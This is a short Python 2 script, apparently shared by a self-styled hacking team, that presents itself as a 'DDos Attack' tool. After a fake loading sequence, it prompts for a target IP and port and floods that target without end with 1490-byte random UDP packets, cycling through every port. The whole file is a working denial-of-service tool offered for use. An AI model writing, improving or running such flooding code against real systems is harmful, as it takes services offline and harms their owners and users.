import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

print
print "Author   : PROFESOR ACC"
print "Team     : QOBIL IS THE FIRST KILLER"
print "github   : https://github.com/KangProf"
print "Date.    : 05-07-2021"
print "Youtube  : Profesor Acc"
print "===========> Jepara Weddos Cyber <=============="
print

ip = raw_input("IP Target : ")
port = input  ("PORT      : ")

os.system("clear")
os.system("figlet Attack Starting")
print "Harap tunggu,Sedang Proses! "
time.sleep(5)
print "Loading 0%"
time.sleep(5)
print "Loading 25%"
time.sleep(5)
print "Loading 50%"
time.sleep(5)
print "Loading 75%"
time.sleep(5)
print "Loading 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught Port"%(sent,ip)
     if port == 65534:
       port = 1
